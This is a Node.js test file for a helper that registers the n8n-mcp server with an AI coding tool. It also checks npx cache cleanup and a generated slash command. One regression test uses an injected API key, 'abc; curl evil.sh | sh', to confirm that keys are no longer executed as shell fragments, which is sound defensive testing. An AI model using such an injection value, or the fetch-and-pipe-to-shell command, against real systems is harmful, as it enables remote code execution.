'use strict';
const { test } = require('node:test');
const assert = require('node:assert');
const MCP = require('../lib/mcp');

// ─── Detecting an existing install ────────────────────────────────────────





// ─── Registration arguments ───────────────────────────────────────────────

test('mcpAddArgs registers at user scope with the local API url', () => {
  const args = MCP.mcpAddArgs({ apiUrl: 'http://localhost:5678' });
  assert.deepStrictEqual(args.slice(0, 5), ['mcp', 'add', 'n8n-mcp', '-s', 'user']);
  assert.ok(args.includes('N8N_API_URL=http://localhost:5678'));
  assert.deepStrictEqual(args.slice(-4), ['--', 'npx', '--yes', 'n8n-mcp']);
});

test('mcpAddArgs omits the API key entirely when none is given', () => {
  const args = MCP.mcpAddArgs({ apiUrl: 'http://localhost:5678' });
  assert.ok(!args.some((a) => a.startsWith('N8N_API_KEY')),
    'an empty key must not be registered as a blank value');
});

test('mcpAddArgs keeps an API key as one argument, never a shell fragment', () => {
  // The shipped build joined these into a string for execSync, so a key with a
  // metacharacter was executed rather than passed.
  const nasty = 'abc; curl evil.sh | sh';
  const args = MCP.mcpAddArgs({ apiKey: nasty, apiUrl: 'http://localhost:5678' });
  assert.ok(args.includes(`N8N_API_KEY=${nasty}`),
    'the key travels as a single argv entry, intact and unsplit');
});

// ─── npx cache hygiene ────────────────────────────────────────────────────
// An interrupted `npx n8n-mcp` leaves the package dir with no readable
// package.json, and every later run fails against the corpse.

test('isCorruptNpxEntry flags a present package with an unreadable manifest', () => {
  assert.strictEqual(MCP.isCorruptNpxEntry({ hasPackageDir: true, packageJsonText: null }), true);
  assert.strictEqual(MCP.isCorruptNpxEntry({ hasPackageDir: true, packageJsonText: '' }), true);
  assert.strictEqual(MCP.isCorruptNpxEntry({ hasPackageDir: true, packageJsonText: '{ truncated' }), true);
});

test('isCorruptNpxEntry leaves a healthy cache entry alone', () => {
  assert.strictEqual(
    MCP.isCorruptNpxEntry({ hasPackageDir: true, packageJsonText: '{"name":"n8n-mcp"}' }), false);
});

test('isCorruptNpxEntry never flags an entry that does not hold the package', () => {
  // Deleting these would wipe unrelated npx caches.
  assert.strictEqual(MCP.isCorruptNpxEntry({ hasPackageDir: false, packageJsonText: null }), false);
  assert.strictEqual(MCP.isCorruptNpxEntry({ hasPackageDir: false, packageJsonText: '{ truncated' }), false);
});

// ─── Generated slash command ──────────────────────────────────────────────

test('mentatCommandDoc names the tools it grants and the live n8n url', () => {
  const doc = MCP.mentatCommandDoc({ apiUrl: 'http://localhost:5678' });
  assert.match(doc, /^---\nname: mentat-n8na/);
  assert.ok(doc.includes('mcp__n8n-mcp__*'));
  assert.ok(doc.includes('http://localhost:5678'));
  assert.ok(doc.includes('$ARGUMENTS'), 'without this the command ignores what the user typed');
});
